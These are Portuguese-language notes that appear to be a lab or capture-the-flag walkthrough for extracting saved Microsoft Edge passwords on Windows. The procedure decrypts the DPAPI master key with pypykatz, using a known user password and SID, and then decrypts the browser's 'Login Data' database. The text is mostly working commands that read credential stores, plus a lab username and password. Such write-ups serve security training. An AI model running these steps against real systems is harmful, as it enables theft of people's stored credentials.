###### Info
```sh
User        : developer
Password    : P@ssw0rd
```

O arquivo que armazena as senhas do edge costuma está criptografado com o mecanismo do DPAPI. O DPAPI é uma forma de criptografia do Windows que usa a senha do usuário para criptografar os arquivos/informações. Como nós sabemos a senha do usuário Developer, podemos usá-la para descriptografar.
###### Banco de dados com a senha
Esse é o banco de dados que armazena as credenciais
```sh
$ C:\Users\developer\appdata\local\microsoft\edge\user data\default\login
data
```
###### Local State
Iremos identificar a Master Key pelo arquivo “Local state”. Extraindo o blob do DPAPI do arquivo “local state”:
```sh
$ C:\Users\developer\appdata\local\microsoft\edge\user data\local
state
```

Retiramos o blob
```sh
$ cat 'Local State' | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- >
dpapi_blob
```

Agora fazemos a identificação:
```sh
$ pypykatz dpapi describe blob dpapi_blob
d75214e4-4dec-4f0b-b133-bbe5a8024962
```
###### Localizer a master key
A master key fica localizada dentro da pasta nomeada com o SID ,pode haver mais de uma, por isso fizemos o processo anterior,para sabermos a chave certa. Agora fazemos o dump da Master Key certa e anotamos  o SID
```sh
$ C:\Users\developer\AppData\Roaming\microsoft\protect> ls
S-1-5-21-2710987025-548725527-3012655242-1002

$ C:\Users\developer\AppData\Roaming\microsoft\protect> cd S-1-5-21-2710987025-548725527-3012655242-1002

$ C:\Users\developer\AppData\Roaming\microsoft\protect\S-1-5-21-2710987025-548725527-3012655242-1002> ls

$ C:\Users\developer\AppData\Roaming\microsoft\protect> gci -hidden
d75214e4-4dec-4f0b-b133-bbe5a8024962
```
Devido as proteções deste arquivo temos que fazer o dump via smb.
#### Cracking
###### Gerando a prekey file
```sh
$ pypykatz dpapi prekey password S-1-5-21-2710987025-548725527-3012655242-1002
'[Developer Password]' > prekey_file
```
###### Gerando a masterkey file
```sh
$ pypykatz dpapi masterkey d75214e4-4dec-4f0b-b133-bbe5a8024962 prekey_file -o
masterkey_file
```
###### Extraindo a senha
```sh
$ pypykatz dpapi chrome --logindata 'login data' masterkey_file 'local state'
```